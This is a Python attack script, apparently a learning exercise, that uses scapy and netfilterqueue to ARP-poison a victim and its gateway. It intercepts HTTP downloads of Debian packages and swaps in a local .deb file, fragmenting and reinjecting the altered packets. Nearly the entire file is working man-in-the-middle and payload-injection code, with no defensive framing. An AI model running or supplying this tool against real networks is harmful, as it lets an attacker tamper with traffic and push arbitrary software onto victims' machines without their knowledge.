#! /usr/bin/python3

from scapy.all import *
from scapy.layers.http import *
import netfilterqueue
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victim", dest="victim", help="Victim IP")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP")
    parser.add_argument("-q", "--queue", dest="queue", help="Netfilterqueue number")
    options = parser.parse_args()
    return options

def get_mac(ip):
    ans, unans = arping(ip)
    for s, r in ans:
        return r[Ether].src

class Spoofing():

    def __init__(self, victim_ip, gateway_ip):
        # Map victim's IP address to its original MAC address:
        self.victim = {
            "IP": victim_ip,
            "MAC": get_mac(victim_ip)
        }

        # Map gateway's IP address to its original MAC address:
        self.gateway = {
            "IP": gateway_ip,
            "MAC": get_mac(gateway_ip)
        }

    def spoof(self):
        # Poison victim's ARP table:
        send(
            ARP(
                op = 2,
                pdst = self.victim["IP"],
                hwdst = self.victim["MAC"],
                psrc = self.gateway["IP"]
            ),
            verbose = False
        )

        # Poison gateway's ARP table:
        send(
            ARP(
                op = 2,
                pdst = self.gateway["IP"],
                hwdst = self.gateway["MAC"],
                psrc = self.victim["IP"]
            ),
            verbose = False
        )

    def unspoof(self):
        print("unspoofing routine running...")

        # Restore victim's ARP table:
        send(
            ARP(
                op = 2,
                pdst = self.victim["IP"],
                hwdst = self.victim["MAC"],
                psrc = self.gateway["IP"],
                hwsrc = self.gateway["MAC"]
            ),
            count = 4,
            verbose = False
        )

        # Restore gateway's ARP table:
        send(
            ARP(
                op = 2,
                pdst = self.gateway["IP"],
                hwdst = self.gateway["MAC"],
                psrc = self.victim["IP"],
                hwsrc = self.victim["MAC"]
            ),
            count = 4,
            verbose = False
        )

    def intercept(self, packet):
        # Use scapy's interface to manipulate packet:
        pkt = IP(packet.get_payload())

        # If is TCP/IP:
        if pkt[IP].haslayer(TCP):

            # If is an HTTP response:
            if pkt[TCP].haslayer(HTTPResponse):

                # If the content is a debian package:
                if pkt[HTTPResponse].Content_Type == b'application/x-debian-package':

                    # Read the debian package into a variable:
                    with open("wireshark_3.0.5-1.deb", "rb") as file:
                        deb = file.read()

                    # Update the content length in bytes in the HTTP header:
                    pkt[HTTPResponse].Content_Length = bytes(str(len(deb)).encode("ascii"))

                    # Place the debian package in the raw payload:
                    pkt[Raw].load = deb

                    # Delete old lengths and checksums to make scapy recalculate them
                    # when rebuilding the packet:
                    del pkt[IP].len
                    del pkt[IP].chksum
                    del pkt[TCP].chksum

                    # Since the packet with the appended debian package file is larger
                    # than the MTU, we have to use scapy to fragment the packet into
                    # smaller ones:
                    frags = fragment(pkt)

                    # Send all fragments:
                    for frag in frags:
                        send(frag)

                    # Since scapy has dealt with the packet, netfilterqueue can discard it:
                    return

        # Let netfilterqueue send the packet forward:
        packet.accept()

if __name__ == "__main__":
    load_layer("http")
    options = get_arguments()

    spoofer = Spoofing(options.victim, options.gateway)
    queue = netfilterqueue.NetfilterQueue()

    # Bind queue to the routine to be run for each packet to be forwarded:
    queue.bind(int(options.queue), spoofer.intercept)

    spoofer.spoof()

    try:
        queue.run()
    except:
        # If something happens to the proccess,
        # restore the direct connection:
        spoofer.unspoof()
